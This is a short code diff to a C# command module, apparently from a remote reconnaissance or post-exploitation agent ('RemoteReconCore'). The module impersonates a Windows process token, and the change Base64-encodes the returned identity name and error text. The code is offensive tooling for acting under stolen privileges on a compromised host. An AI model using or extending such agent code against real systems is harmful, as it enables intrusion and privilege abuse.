@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Security.Principal;
+using System.Text;
 
 // This command will open a process token to impersonate
 namespace RemoteReconCore
@@ -33,11 +34,13 @@ namespace RemoteReconCore
             try
             {
                 Agent.context = newId.Impersonate();
-                return new KeyValuePair<int, string>(0, newId.Name);
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(newId.Name));
+                return new KeyValuePair<int, string>(0, msg);
             }
             catch (Exception e)
             {
-                return new KeyValuePair<int, string>(4, e.ToString());
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+                return new KeyValuePair<int, string>(4, msg);
             }
         }
     }
